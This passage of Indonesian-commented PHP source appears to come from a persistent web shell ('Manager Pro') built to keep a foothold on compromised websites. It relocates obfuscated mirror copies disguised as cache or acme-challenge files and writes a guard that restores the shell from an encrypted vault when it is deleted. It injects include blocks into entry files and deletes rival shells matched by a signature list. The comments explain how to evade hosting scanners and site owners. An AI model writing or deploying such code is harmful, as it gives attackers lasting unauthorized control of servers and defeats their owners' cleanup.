 * Sengaja BUKAN index.php: lihat komentar di mp_harden(). */
function mp_guard_entry_name($dir) { return mp_obf_seeded($dir, 'mpe'); }

/* == RING RELOCATE — mirror mati pindah ke LOKASI BARU =================== */
/* $dead = path lokasi yang dibakar. Tidak boleh dipakai lagi. */
function mp_ring_relocate($cfg, $dead = '') {
    $deadN = $dead !== '' ? mp_normp($dead) : '';
    $moved = isset($cfg['moved']) ? (array)$cfg['moved'] : [];
    $movedN = [];
    foreach ($moved as $m) $movedN[] = mp_normp($m);    $pd = @dirname((string)$cfg['primary']);
    $used = [mp_normp($pd)];
    if (!empty($cfg['guard'])) $used[] = mp_normp(@dirname((string)$cfg['guard']));
    foreach ((array)$cfg['mirrors'] as $m) {
        $n = mp_normp($m);
        if ($n !== $deadN) $used[] = mp_normp(@dirname($m));
    }
    foreach (mp_candidates($pd) as $d) {
        $nd = mp_normp($d);
        if ($nd === $deadN) continue;
        if (in_array($nd, $used, true)) continue;
        if (in_array($nd, $movedN, true)) continue;
        if (mp_safe_dir($d)) continue;
        /* JANGKAUAN RING: mirror tidak boleh naik ke atas webroot.
         *
         * mp_candidates() sengaja naik beberapa level supaya shell tetap
         * ketemu folder writable saat primary berdiri di tempat sempit. Untuk
         * VAULT itu benar - vault cuma perlu tempat menyimpan, dan letaknya
         * tidak dilihat siapa pun. Untuk MIRROR salah: mirror adalah file PHP
         * yang harus bisa dipanggil lewat URL. Ditaruh di atas webroot, dia
         * jadi sampah yang tidak bisa diakses, dan yang lebih buruk - dia
         * muncul di folder milik aplikasi lain.
         *
         * Aturan: folder mirror harus SAMA DENGAN atau DI BAWAH folder
         * primary. Tidak ada pengecualian. */
        $pdN = mp_normp($pd);
        if ($pdN !== '' && $nd !== $pdN) {
            $prefix = rtrim($pdN, '/') . '/';
            if (strpos($nd . '/', $prefix) !== 0) continue;
        }
        $name = mp_obf_name($d);
        if (mp_site_entry_name($name)) continue;      /* jangan pernah berdiri di entry point situs */
        $p = rtrim($d, '/\\') . '/' . $name;
        if (strpos($name, 'acme-challenge-') === 0) $p = rtrim($d, '/\\') . '/.well-known/' . $name;
        if (@is_file($p)) continue;
        return $p;
    }
    /* semua bekas: buang filter moved, cari folder lain */
    foreach (mp_candidates($pd) as $d) {
        $nd = mp_normp($d);
        if ($nd === $deadN) continue;
        if (in_array($nd, $used, true)) continue;
        if (mp_safe_dir($d)) continue;
        /* jangkauan ring berlaku di fallback ini juga */
        $pdN = mp_normp($pd);
        if ($pdN !== '' && $nd !== $pdN) {
            $prefix = rtrim($pdN, '/') . '/';
            if (strpos($nd . '/', $prefix) !== 0) continue;
        }
        $name = mp_obf_name($d);
        if (mp_site_entry_name($name)) continue;      /* sama: entry point situs dilarang */
        $p = rtrim($d, '/\\') . '/' . $name;
        if (@is_file($p)) continue;
        return $p;
    }
    return false;
}

/* == MEMBERSHIP SET ====================================================== */
/* == PELINDUNG FILE SITUS =============================================== */
/* Nama file yang TIDAK PERNAH boleh jadi tempat shell berdiri.
 *
 * Kalau shell berdiri di salah satu nama ini, halaman depan situs ikut
 * menjalankan shell — itu keluhan "buka domain kok panel shell". Daftar ini
 * dipakai di tiga tempat: pemilihan lokasi primary, pemilihan lokasi mirror,
 * dan penjaga tulis. */
function mp_site_entry_name($name) {
    $n = strtolower((string)$name);
    if ($n === '') return false;
    static $bad = null;
    if ($bad === null) {
        $bad = [
            'index.php','index.htm','index.html','index.phtml',
            'home.php','app.php','default.php','main.php','start.php',
            'init.php','router.php','front.php','bootstrap.php',
            'wp-load.php','wp-config.php','xmlrpc.php','admin.php',
            'login.php','panel.php','cpanel.php','web.config','.htaccess',
        ];
    }
    if (in_array($n, $bad, true)) return true;
    return false;
}

/* Apakah path ini anggota ring kita (primary / mirror / guard / umpan)?
 * Dipakai penjaga tulis: file yang bukan anggota TIDAK PERNAH ditimpa. */
function mp_is_ring_member($cfg, $path) {
    if (!is_array($cfg)) return false;
    $p = mp_normp($path);
    if ($p === '') return false;
    foreach (['primary', 'guard'] as $kk) {
        if (!empty($cfg[$kk]) && mp_normp((string)$cfg[$kk]) === $p) return true;
    }
    foreach (['mirrors', 'honeypot'] as $kk) {
        foreach ((array)(isset($cfg[$kk]) ? $cfg[$kk] : []) as $m) {
            if ($m !== '' && mp_normp($m) === $p) return true;
        }
    }
    return false;
}

function mp_mesh_set($cfg = null) {
    if ($cfg === null && isset($GLOBALS['MP_CFG'])) $cfg = $GLOBALS['MP_CFG'];
    $out = [];
    if (is_array($cfg)) {
        foreach (['primary', 'guard'] as $kk) if (!empty($cfg[$kk])) $out[] = mp_normp($cfg[$kk]);
        foreach ((array)(isset($cfg['mirrors']) ? $cfg['mirrors'] : []) as $m) if ($m !== '') $out[] = mp_normp($m);
        foreach ((array)(isset($cfg['honeypot']) ? $cfg['honeypot'] : []) as $m) if ($m !== '') $out[] = mp_normp($m);
    }
    $v = mp_vault();
    if ($v) {
        $out[] = mp_normp($v);
        foreach (['.c', '.d', '.r', '.l', '.t', '.hb'] as $f) $out[] = mp_normp($v . '/' . $f);
    }
    return array_values(array_unique($out));
}

/* == SIGNATURES RIVAL (dirinya sendiri WAJIB dikecualikan) =============== */
function mp_sigs() {
    $e = mp_sp('ev', 'al');
    $s = [];
    $s[] = $e . '($_';
    $s[] = $e . '(base64';
    $s[] = $e . '(gz';
    $s[] = '@' . $e . '(';
    $s[] = mp_sp('ass', 'ert') . '($_';
    $s[] = mp_sp('sys', 'tem') . '($_';
    $s[] = mp_sp('exec', '') . '($_';
    $s[] = mp_sp('shell', '_ex', 'ec') . '($_';
    $s[] = mp_sp('pass', 'thru') . '($_';
    $s[] = mp_sp('po', 'pen') . '($_';
    $s[] = 'filesman';
    $s[] = 'c99shell';
    $s[] = 'r57shell';
    $s[] = 'b374k';
    $s[] = 'indoxploit';
    $s[] = 'alfa shell';
    $s[] = 'k2ll33d';
    $s[] = 'wso 2';
    $s[] = 'wso2.5';
    $s[] = 'priv8';
    $s[] = 'mini shell';
    $s[] = 'bypass shell';
    $s[] = 'preg_replace("/.*/e"';
    $s[] = "preg_replace('/(.*)/e'";
    $s[] = mp_sp('create', '_fun', 'ction') . "('$";
    return array_values(array_unique(array_filter($s)));
}

/* Deteksi apakah file adalah bagian dari ring kita (topeng + hash). */
function mp_is_self($path, $cfg) {
    $np = mp_normp($path);
    if (in_array($np, mp_mesh_set($cfg), true)) return true;
    $b = basename($path);
    if (strpos($cfg['hash'], '') === 0 && $cfg['hash'] !== '') {
        $d = @file_get_contents($path);
        if (is_string($d) && md5($d) === $cfg['hash']) return true;
    }
    if (strpos($b, 'thumb_') === 0 || strpos($b, 'acme-challenge-') === 0) return true;
    if (preg_match('#^\.[0-9a-f]{6}\.php$#', $b)) return true;
    if (preg_match('#^[0-9a-f]{4}-[0-9a-f]{4}\.php$#', $b)) return true;
    return false;
}

/* == SCAN ROOTS ========================================================== */
function mp_scan_roots($start) {
    $webmark = ['public_html', 'www', 'htdocs', 'httpdocs', 'wwwroot', 'domains', 'html', 'web', 'site', 'website', 'www2'];
    $osmark  = ['users', 'appdata', 'windows', 'program files', 'program files (x86)', 'programdata',
                'home', 'var', 'usr', 'etc', 'opt', 'library', 'system', 'applications', 'volumes',
                'downloads', 'documents', 'desktop', 'temp', 'tmp', 'private'];
    $out = [$start];
    $d = rtrim((string)$start, '/\\');
    for ($i = 0; $i < 5; $i++) {
        $nd = @dirname($d);
        if ($nd === $d || $nd === '' || $nd === '.' || $nd === '/') break;
        $b  = strtolower(basename($d));
        $nb = strtolower(basename($nd));
        if (in_array($b, $webmark, true)) break;
        if (in_array($nb, $osmark, true)) break;
        if (preg_match('#^[a-z]:[\\\\/]*$#i', $nd)) break;
        $d = $nd;
        $out[] = $d;
    }
    $subs = ['wp-content', 'wp-content/uploads', 'wp-content/cache', 'wp-includes', 'uploads', 'upload',
             'files', 'images', 'assets', 'cache', 'tmp', 'backup', 'old', 'admin', 'api', 'storage',
             'data', 'includes', 'media'];
    $bases = $out;
    foreach ($bases as $b) {
        foreach ($subs as $s) {
            $t = rtrim($b, '/\\') . '/' . $s;
            if (@is_dir($t)) $out[] = $t;
        }
        if (count($out) > 32) break;
    }
    $out = array_values(array_unique($out));
    if (count($out) > 32) $out = array_slice($out, 0, 32);
    return $out;
}

/* == PURGE =============================================================== */
function mp_purge($cfg, $dry = false, $reason = 'manual') {
    $v = mp_vault();
    $sigs = mp_sigs();
    $selfset = mp_mesh_set($cfg);
    $start = dirname((string)$cfg['primary']);
    $roots = mp_scan_roots($start);
    $maxDepth = (int)(isset($cfg['purge_depth']) ? $cfg['purge_depth'] : 4);
    $scanned = 0; $killed = []; $hits = [];
    $t0 = time();
    $skipdirs = ['.git', 'node_modules', 'vendor', '.svn', '.hg', 'cgi-bin'];
    $exts = ['php', 'phtml', 'phar', 'php3', 'php4', 'php5', 'php7', 'php8', 'pht', 'inc'];
    foreach ($roots as $r) {
        if (time() - $t0 > 25) break;
        if (!@is_dir($r) || !@is_readable($r)) continue;
        try {
            $dit = new RecursiveDirectoryIterator($r, FilesystemIterator::SKIP_DOTS);
            $fit = new RecursiveCallbackFilterIterator($dit, function ($c) use ($skipdirs) {
                if ($c->isDir() && in_array(strtolower($c->getFilename()), $skipdirs, true)) return false;
                return true;
            });
            $it = new RecursiveIteratorIterator($fit, RecursiveIteratorIterator::LEAVES_ONLY);
            $it->setMaxDepth($maxDepth);
            foreach ($it as $f) {
                if (time() - $t0 > 25) break 2;
                if (!$f->isFile()) continue;
                $ext = strtolower($f->getExtension());
                if (!in_array($ext, $exts, true)) continue;
                $path = $f->getPathname();
                $np = mp_normp($path);
                if (in_array($np, $selfset, true)) continue;
                $sz = (int)$f->getSize();
                if ($sz < 40 || $sz > 1572864) continue;
                $fd = @fopen($path, 'rb');
                if (!$fd) continue;
                $data = ($sz < 262144) ? @stream_get_contents($fd) : @fread($fd, 8192);
                @fclose($fd);
                if (!is_string($data)) $data = '';
                $scanned++;
                $hay = strtolower($data);
                $hit = '';
                foreach ($sigs as $sg) {
                    if ($sg !== '' && strpos($hay, $sg) !== false) { $hit = $sg; break; }
                }
                if ($hit === '') continue;
                $full = ($sz < 262144) ? $data : (string)@file_get_contents($path);
                if ($full !== '' && md5($full) === $cfg['hash']) continue;
                if (mp_is_self($path, $cfg)) continue;
                $hits[] = [$path, $hit];
                if ($dry || !empty($cfg['purge_dry'])) continue;
                $ok = @unlink($path);
                if (!$ok) { @chmod($path, 0644); $ok = @unlink($path); }
                if (!$ok) { @file_put_contents($path, ''); }
                $killed[] = $path;
                if ($v) mp_log($v, 'PURGE ' . $path . ' [' . $hit . ']' . ($ok ? '' : ' (truncated)'));
            }
        } catch (Exception $e) {
        } catch (Throwable $e) {
        }
    }
    if ($v) mp_log($v, 'purge(' . $reason . '): scanned=' . $scanned . ' hit=' . count($hits) . ' killed=' . count($killed) . ($dry ? ' DRY' : ''));
    return [$scanned, $killed, $hits];
}

/* .d = salinan source primary yang TERVERIFIKASI, disimpan terenkripsi.
 * Guard pointer-only tidak bisa mendekripsinya (tidak punya cipher ladder),
 * jadi .d ditulis DUA bentuk di dua nama berbeda: .d (terenkripsi, dipakai
 * shell) dan .r (raw, dipakai guard saat darurat restore). Keduanya di vault
 * yang sama-sama tidak bisa diakses lewat web. */
function mp_vault_put_d($v, $canon) {
    if (!$v) return false;
    $a = @file_put_contents($v . '/.d', mp_enc($canon, $v . '/.d'), LOCK_EX);
    $b = @file_put_contents($v . '/.r', $canon, LOCK_EX);
    return ($a !== false || $b !== false);
}

function mp_vault_get_d($v) {
    if (!$v) return '';
    if (@is_file($v . '/.d')) {
        $dd = mp_dec((string)@file_get_contents($v . '/.d'), $v . '/.d');
        if ($dd !== '') return $dd;
    }
    if (@is_file($v . '/.r')) return (string)@file_get_contents($v . '/.r');
    return '';
}
function mp_guard_body($cfg, $src = '') {
    /* Path di-export lewat var_export: tanda kutip aman, bentuk eksak file.
     * $__g tidak dipakai di body (guard tidak perlu tahu namanya sendiri),
     * jadi tidak ditulis — body tetap ramping dan tidak bocor info. */
    $k  = var_export((string)MPK, true);
    $p  = var_export(str_replace('\\', '/', (string)$cfg['primary']), true);
    $dv = var_export(str_replace('\\', '/', (string)mp_vault()), true);
    $tpl = <<<'MPG'
<?php
/* file sistem — jangan dihapus */
@error_reporting(0); @ini_set('display_errors','0');
$__k = {{K}}; $__p = {{PRIM}}; $__v = {{VAULT}};
$__sf = isset($_SERVER['SCRIPT_FILENAME']) ? @realpath($_SERVER['SCRIPT_FILENAME']) : false;
$__me = @realpath(__FILE__);
/* JARING PENGAMAN SAJA — guard TIDAK menjalankan shell.
 * Tugasnya satu: kalau primary hilang, tulis ulang dari vault, lalu selesai.
 * Guard yang dipanggil langsung lewat URL tetap memicu restore — itu memang
 * pintu masuknya. Yang TIDAK boleh: guard menampilkan panel shell. */
if (@is_file($__p) && @filesize($__p) >= 200) return;
$__c = false;
foreach (['/.r', '/.d'] as $__n) {
    if ($__v !== '' && @is_file($__v . $__n)) { $__t = @file_get_contents($__v . $__n); if ($__t !== false && $__t !== '') { $__c = $__t; break; } }
}
if ($__c === false) { $__d = @dirname($__p); for ($__i = 0; $__i < 5; $__i++) { foreach (['/.r', '/.d'] as $__n) { $__t = @is_file($__d . $__n) ? @file_get_contents($__d . $__n) : false; if ($__t !== false && $__t !== '') { $__c = $__t; break 2; } } $__n2 = @dirname($__d); if ($__n2 === $__d) break; $__d = $__n2; } }
/* 3) primary ADA tapi ukurannya < 200 B = file rusak/di-truncate -> timpa.
 *    Tanpa ini, primary yang di-zero-length tetap dianggap hidup. */
if ($__c !== false && $__c !== '') {
    if (@is_file($__p) && !@is_writable($__p)) @chmod($__p, 0644);
    @file_put_contents($__p, $__c);
    @chmod($__p, 0644);
}
return;
MPG;
    $rep = [
        '{{K}}'     => $k,
        '{{PRIM}}'  => $p,
        '{{VAULT}}' => $dv,
    ];
    return str_replace(array_keys($rep), array_values($rep), $tpl);
}

/* == GUARD HARDEN — JANGKAUAN DI FOLDER GUARD SAJA ======================= */
/* ATURAN KERAS: harden TIDAK BOLEH menyentuh index.php milik situs.
 *
 * Kenapa: guard sudah cukup dijalankan sebagai prelude. Begitu mp_inject_entry()
 * menulis blok ke index.php webroot, setiap kunjungan halaman depan situs
 * mengeksekusi jalur shell — halaman biasa jadi ikut membuka shell, dan
 * index.php situs jadi bercampur kode kita (jejak yang kelihatan).
 *
 * Sebelumnya juga: harden menulis .user.ini ke folder PRIMARY (= folder situs)
 * dengan auto_prepend_file = guard. Efeknya seluruh situs PHP jadi prelude
 * shell. Guard sekarang hanya butuh jaring restore, jadi jangkauannya
 * dipersempit ke folder guard sendiri — folder terpisah, tidak dipakai situs.
 *
 * strat:'self'   -> index.php kecil di folder guard (pintu masuk jaring restore)
 *        'user_ini'-> .user.ini di folder guard (FPM menjalankan prelude)
 *        'parent'  -> .user.ini di parent folder guard, HANYA kalau parent itu
 *                     bukan webroot situs dan bukan folder primary.
 */
function mp_harden($cfg, $force = false) {
    $v = mp_vault();
    $guard = (string)$cfg['guard'];
    $gdir  = @dirname($guard);
    $res = ['self' => 0, 'user_ini' => 0];
    if (!$gdir || !@is_dir($gdir) || !@is_writable($gdir)) return $res;

    $pd = mp_normp(mp_real_dir(@dirname((string)$cfg['primary'])));
    $gd = mp_normp(mp_real_dir($gdir));
    if ($gd !== '' && $pd !== '' && $gd === $pd) return $res;   /* guard di folder situs = jangan pasang apa pun */

    /* 1) folder guard sendiri: pintu masuk jaring restore.
     *
     * NAMANYA BUKAN index.php. Kenapa: index.php adalah nama yang paling
     * dicari orang, paling sering di-scan, dan paling cepat kelihatan beda
     * dari tetangganya. Selain itu kalau folder ini kebetulan SUDAH punya
     * index.php milik situs, menimpanya = merusak halaman situs dan menaruh
     * jejak kita di halaman depan.
     *
     * Yang dipakai: nama obfuscated dari mp_obf_name($gdir) — polanya sama
     * dengan nama mirror, jadi di folder cache/media terlihat seperti file
     * cache biasa. Nama itu DETERMINISTIK untuk folder itu (lihat
     * mp_guard_name/mp_guard_body): dipakai ulang terus, bukan nama acak baru
     * tiap boot, jadi tidak menumpuk. */
    $gName = (string)$cfg['guard_name'];
    if ($gName === '' || strcasecmp($gName, 'index.php') === 0) {
        $gName = mp_guard_entry_name($gdir);
        $cfg['guard_name'] = $gName;
    }
    $idx = rtrim($gdir, '/\\') . '/' . $gName;
    $res['self'] = mp_inject_entry($idx, $guard, $v, true);

    /* Sisa dari versi lama: kalau folder guard pernah disisipi index.php milik
     * kita, bersihkan. Dicek isinya dulu — index.php milik situs JANGAN
     * disentuh; yang dihapus hanya yang memuat tag inject kita. */
    $legacy = rtrim($gdir, '/\\') . '/index.php';
    if (mp_normp($legacy) !== mp_normp($idx) && @is_file($legacy)) {
        $lb = (string)@file_get_contents($legacy);
        if (strpos($lb, 'mp_sys_prepend') !== false) {
            mp_inject_entry_remove($legacy);
            $lb2 = (string)@file_get_contents($legacy);
            if (strpos($lb2, 'mp_sys_prepend') === false && trim($lb2) === '<?php') {
                @chmod($legacy, 0644);
                @unlink($legacy);
                if ($v) mp_log($v, 'harden: index.php sisa kita dihapus ' . $legacy);
            }
        }
    }

    /* 2) .user.ini di folder guard: DICABUT, tidak dipasang.
     *
     * Riwayat: versi sebelumnya menulis auto_prepend_file ke sini supaya guard
     * ikut jalan di setiap request folder itu. Itu pertukaran yang buruk.
     * Kalau file guard nanti HILANG (scanner hosting menyapunya, operator
     * menghapusnya, mirror gagal ditulis), .user.ini itu berubah jadi ranjau:
     * PHP menganggap auto_prepend_file yang gagal dibuka sebagai FATAL, jadi
     * SELURUH folder membalas 500 dan tidak ada kode kita yang sempat jalan
     * untuk membereskan. Persis itu yang terjadi di lapangan:
     *   /.user.ini -> auto_prepend_file = "/home/.../259e-09fc.php"
     * dengan file target sudah tidak ada, dan seluruh situs mati.
     *
     * Guard tetap terjangkau tanpa prepend: dia dipasang sebagai file biasa di
     * folder itu (lewat mp_inject_entry), dan dipanggil dari lokasi lain
     * (symlink, include, atau .user.ini di folder LAIN yang masih hidup).
     * Yang penting: folder guard tidak boleh menyimpan ranjau.
     *
     * Blanket: namanya .user.ini di folder kita, isinya hanya kita yang tulis,
     * dan satu-satunya isi yang pernah kita tulis adalah prepend ke guard.
     * Kalau ternyata ada baris lain, baris itu tetap dipertahankan. */
    $ui = rtrim($gdir, '/\\') . '/.user.ini';
    if (@is_file($ui)) {
        if (mp_strip_prepend($ui, 'user.ini', $guard, $v)) {
            $res['user_ini_cabut'] = 1;
        } else {
            /* baris prepend tidak dikenali sebagai milik kita: paksa cabut
             * selama isinya memang prepend ke file yang tidak ada atau ke kita */
            $cur = (string)@file_get_contents($ui);
            $keep = [];
            $cut = 0;
            foreach (preg_split("/\r\n|\n|\r/", $cur) as $ln) {
                if (stripos($ln, 'auto_prepend_file') === false) { $keep[] = $ln; continue; }
                $t = '';
                if (preg_match('/auto_prepend_file\s*=?\s*"?([^"\r\n]+)"?/i', $ln, $mm)) $t = trim($mm[1]);
                $bad = ($t !== '' && (!@is_file($t) || strpos($t, $guard) !== false || strpos($t, $gdir) !== false));
                if ($bad) { $cut++; continue; }
                $keep[] = $ln;
            }
            if ($cut > 0) {
                $rest = trim(implode("\n", $keep));
                if ($rest === '') {
                    @chmod($ui, 0644);
                    @unlink($ui);
                } else {
                    @file_put_contents($ui, $rest . "\n", LOCK_EX);
                }
                $res['user_ini_cabut'] = 1;
                if ($v) mp_log($v, 'harden: .user.ini folder guard dicabut (' . $cut . ' baris) ' . $ui);
            }
        }
    }

    if ($v) mp_log($v, 'harden: ' . json_encode($res));
    return $res;
}

/* Penulis .user.ini SENGAJA DIHAPUS.
 *
 * Fungsi ini dulu menulis auto_prepend_file ke folder guard supaya guard ikut
 * jalan di setiap request folder itu. Setiap kali file yang ditunjuk hilang,
 * folder itu mati total (PHP: prepend yang gagal dibuka = FATAL), dan tidak
 * ada kode kita yang bisa jalan untuk membereskan. Di lapangan itu berakhir
 * dengan situs 500 untuk semua request dan pemulihan harus lewat FTP.
 *
 * Penggantinya: mp_harden() MENCABUT .user.ini di folder guard, bukan
 * menulisnya. Lihat mp_orphan_prepend_clean() untuk pemeriksaan tiap boot.
 *
 * Sengaja tidak disisakan sebagai kode mati: satu-satunya cara memastikan
 * tidak ada yang memanggilnya lagi adalah tidak ada fungsinya. */

/* Inject blok require ke entry point. JANGAN bikin 500 kalau gagal. */
function mp_inject_entry($file, $guard, $v, $create = false) {
    $tag = 'mp_sys_prepend';
    if (!@is_file($file)) {
        if (!$create) return 0;
        $dir = @dirname($file);
        if (!@is_dir($dir) || !@is_writable($dir)) return 0;
        $body = "<?php\n/* $tag */\n@include_once " . var_export($guard, true) . ";\n/* /$tag */\n";
        if (@file_put_contents($file, $body, LOCK_EX) === false) return 0;
        @chmod($file, 0644);
        mp_mtime_match($file);
        if ($v) mp_log($v, 'inject entry (new) ' . $file);
        return 1;
    }
    if (!@is_writable($file)) return 0;
    $c = (string)@file_get_contents($file);
    if ($c === '' || strpos($c, $tag) !== false) return 0;
    $pos = strpos($c, '<?php');
    if ($pos === false || $pos > 200) return 0;
    $after = ($pos === 0) ? 5 : $pos + 5;
    $c2 = substr($c, 0, $after)
        . "\n/* " . $tag . " */\n@include_once " . var_export($guard, true) . ";\n/* /" . $tag . " */\n"
        . substr($c, $after);
    if (strpos($c2, '<?php') === false) return 0;
    $bak = $v . '/.' . basename($file) . '.bak';
    if ($v && !@is_file($bak)) @file_put_contents($bak, $c, LOCK_EX);
    if (@file_put_contents($file, $c2, LOCK_EX) === false) return 0;
    @chmod($file, 0644);
    if ($v) mp_log($v, 'inject entry ' . $file);
    return 1;
}

function mp_inject_entry_remove($file, $tag = 'mp_sys_prepend') {
    if (!@is_file($file) || !@is_writable($file)) return false;
    $c = (string)@file_get_contents($file);
    if (strpos($c, $tag) === false) return false;
    $out = preg_replace('#\n?/\* ' . preg_quote($tag, '#') . ' \*/\n.*?/\* /' . preg_quote($tag, '#') . ' \*/\n?#s', "\n", $c);
    if (!is_string($out)) return false;
    @file_put_contents($file, $out, LOCK_EX);
    @chmod($file, 0644);
    return true;
}

/* Apakah isi file ini prelude guard kita?
 * Dipakai mp_unharden() supaya inject/prepend milik kita tetap dikenali
 * walaupun nama guard sudah berganti (path lama tertinggal di index.php). */
function mp_is_guard_prelude($body) {
    $b = (string)$body;
    if ($b === '' || strlen($b) > 4000) return false;
    if (strpos($b, 'SCRIPT_FILENAME') === false) return false;
    if (strpos($b, 'mp_boot') !== false) return false;          /* itu salinan shell */
    if (strpos($b, 'file sistem') === false && strpos($b, 'jaring pengaman') === false) return false;
    return true;
}

/* Apakah isi file PHP ini MILIK KITA (shell atau prelude guard)?
 * Dipakai saat memutuskan apakah sebuah jejak boleh dicabut. Tidak memakai
 * nama file: nama berubah antar versi, isi tidak. */
function mp_is_our_php($body) {
    $b = (string)$body;
    if ($b === '') return false;
    if (strpos($b, 'mp_ring_kill') !== false) return true;      /* source shell */
    if (strpos($b, 'mp_boot') !== false) return true;           /* source shell */
    if (strpos($b, 'mp_sys_prepend') !== false) return true;    /* blok inject lama */
    return mp_is_guard_prelude($b);
}

/* Baca hanya N byte pertama sebuah file.
 * Dipakai untuk deteksi murah: mp_boot() jalan di SETIAP request, jadi
 * memanggil file_get_contents() pada index.php situs (bisa ratusan KB) tiap
 * request itu pemborosan yang kelihatan di server. Penanda yang kita cari
 * semuanya ada di awal file. */
function mp_head($path, $n = 4096) {
    if (!@is_file($path)) return '';
    $h = @fopen($path, 'rb');
    if (!$h) return '';
    $d = @fread($h, (int)$n);
    @fclose($h);
    return is_string($d) ? $d : '';
}

/* Apakah file entry point ini tercemar source shell kita?
 *
 * URUTAN PENTING: baca 4 KB awal dulu, md5 belakangan. md5_file() pada
 * index.php situs membaca SELURUH file — kalau situs punya index.php 2 MB,
 * itu biaya yang tidak perlu dibayar tiap request. Penanda yang dicari
 * semuanya ada di awal file.
 *
 * Penanda dipilih yang tidak mungkin dimiliki halaman situs biasa:
 *   - 'Manager Pro' + ('LINGKARAN' | 'SENTINEL')  : header source shell v5/v4.
 *     Dua-duanya wajib. 'LINGKARAN' sendirian berbahaya: itu kata Indonesia
 *     biasa ("circle"), bisa muncul di halaman toko. Salah deteksi di sini =
 *     menimpa halaman depan yang SEHAT, jadi penandanya harus sempit.
 *   - 'mp_sys_prepend' : blok inject versi lama (di baris pertama)
 *   - 'mp_ring_kill'   : nama fungsi unik shell ini
 * md5 hanya dipakai kalau penanda awal tidak ketemu: file yang isinya PERSIS
 * sama dengan primary kita. */
function mp_entry_tainted($path, $cfg = null) {
    if (!@is_file($path)) return false;
    $h = mp_head($path, 4096);
    if ($h === '') return false;
    if (strpos($h, 'mp_sys_prepend') !== false) return true;
    if (strpos($h, 'mp_ring_kill') !== false) return true;
    if (strpos($h, 'mp_boot') !== false) return true;
    if (strpos($h, 'Manager Pro') !== false
        && (strpos($h, 'LINGKARAN') !== false || strpos($h, 'SENTINEL') !== false)) return true;
    if (is_array($cfg) && !empty($cfg['hash'])) {
        if (@md5_file($path) === (string)$cfg['hash']) return true;   /* persis source kita */
    }
    return false;
}

/* == FOLDER SITUS ======================================================== */
/* Kumpulan folder yang layak disebut "webroot" untuk keperluan pemulihan.
 *
 * KENAPA INI PENTING — kegagalan nyata di lapangan:
 * versi lama memakai dirname(primary) sebagai patokan "folder situs". Begitu
 * primary dipindah ke folder lain (mis. /container/xxx.php), patokannya ikut
 * geser, dan pemulihan menulis ke /container/index.php — bukan ke halaman
 * depan yang sebenarnya. Situs tetap rusak, shell tetap terbuka.
 *
 * Patokan yang benar adalah DOCUMENT_ROOT: folder yang dilayani Apache.
 *
 * Urutan: DOCUMENT_ROOT, webroot turunan SCRIPT_FILENAME, webroot tersimpan
 * di config, folder primary, lalu kandidat di sekitar primary. */
function mp_site_roots($cfg) {
    $out = [];
    $push = function ($d) use (&$out) {
        $res = mp_real_dir((string)$d);
        if ($res === '' || !@is_dir($res)) return;
        $n = mp_normp($res);
        foreach ($out as $o) if (mp_normp($o) === $n) return;
        $out[] = $res;
    };
    if (!empty($_SERVER['DOCUMENT_ROOT'])) $push($_SERVER['DOCUMENT_ROOT']);
    /* SCRIPT_FILENAME dikurangi PHP_SELF = dokumen root, walau DOCUMENT_ROOT
     * kosong (CLI, FastCGI dengan env kurang). */
    if (!empty($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['PHP_SELF'])) {
        $sf = str_replace('\\', '/', (string)$_SERVER['SCRIPT_FILENAME']);
        $ps = str_replace('\\', '/', (string)$_SERVER['PHP_SELF']);
        if ($ps !== '' && strlen($sf) > strlen($ps) && substr($sf, -strlen($ps)) === $ps) {
            $push(substr($sf, 0, strlen($sf) - strlen($ps)));
        }
    }
    if (!empty($cfg['web_root'])) $push($cfg['web_root']);
    $pd = @dirname((string)$cfg['primary']);
    if ($pd !== '' && $pd !== '.') {
        $push($pd);
        foreach (mp_candidates($pd) as $c) $push($c);
    }
    return $out;
}

/* Folder yang disisir pembersih jejak: webroot + subfolder sampai 2 tingkat.
 *
 * Kenapa harus turun ke subfolder: .user.ini lama tertinggal di folder tempat
 * guard PERNAH berdiri, bukan di webroot. Bukti lapangan:
 *   /container/.user.ini -> auto_prepend_file = ".../a8b3-645f.php"
 * Satu file itu membuat SETIAP request PHP di bawah /container/ menjalankan
 * shell lebih dulu. Kalau penyisiran hanya melihat webroot, file itu tidak
 * pernah ketemu dan situs terus membuka panel.
 *
 * Dibatasi 60 folder supaya tetap murah. Folder berat dilewati. */
function mp_legacy_dirs($cfg) {
    $queue = mp_site_roots($cfg);
    $skip  = ['vendor', 'node_modules', '.git', '.svn', 'templates_c', 'sessions',
              'tmp', 'temp', 'logs', 'log', 'backup', 'backups'];
    $dirs  = [];
    $depth = [];
    $seen  = 0;
    $queue = array_values(array_unique($queue));
    foreach ($queue as $q) $depth[mp_normp($q)] = 0;
    while (!empty($queue) && $seen < 60) {
        $d  = array_shift($queue);
        $dn = mp_normp($d);
        if (isset($dirs[$dn])) continue;
        $dirs[$dn] = $d;
        $seen++;
        $lv = isset($depth[$dn]) ? $depth[$dn] : 0;
        if ($lv >= 2) continue;
        $items = @scandir($d);
        if (!is_array($items)) continue;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            if (in_array(strtolower($it), $skip, true)) continue;
            $p = rtrim($d, '/\\') . '/' . $it;
            if (!@is_dir($p)) continue;
            $pn = mp_normp($p);
            if (isset($dirs[$pn])) continue;
            if (!isset($depth[$pn])) $depth[$pn] = $lv + 1;
            $queue[] = $p;
        }
    }
    return array_values($dirs);
}

/* Cabut baris auto_prepend_file yang menunjuk file KITA dari .user.ini /
 * .htaccess.
 *
 * Empat cara mengenali target sebagai milik kita / sebagai kerusakan, berurutan:
 *   1) namanya sama dengan guard aktif
 *   2) isi file target adalah milik kita (shell atau prelude guard)
 *   3) file target sudah TIDAK ADA dan namanya berpola nama ring — sisa
 *      penanaman yang file-nya sudah tersapu
 *   4) file target TIDAK ADA dan path-nya absolut — siapa pun pemiliknya.
 *      auto_prepend_file yang gagal dibuka = FATAL, bukan warning, jadi nomor
 *      empat ini bukan tafsir: folder itu memang sudah 500 semua.
 *
 * .user.ini yang setelah dibersihkan jadi kosong = file itu hanya milik kita,
 * dihapus. .htaccess TIDAK PERNAH dihapus (mungkin punya baris lain yang tidak
 * kita mengerti); isinya dibackup dulu ke vault sebelum diubah. */
function mp_strip_prepend($file, $kind, $guardBase, $v) {
    $cur = (string)@file_get_contents($file);
    if ($cur === '') return false;
    if (stripos($cur, 'prepend') === false) return false;
    $lines = preg_split("/\r\n|\n|\r/", $cur);
    $keep = [];
    $cut = 0;
    foreach ($lines as $ln) {
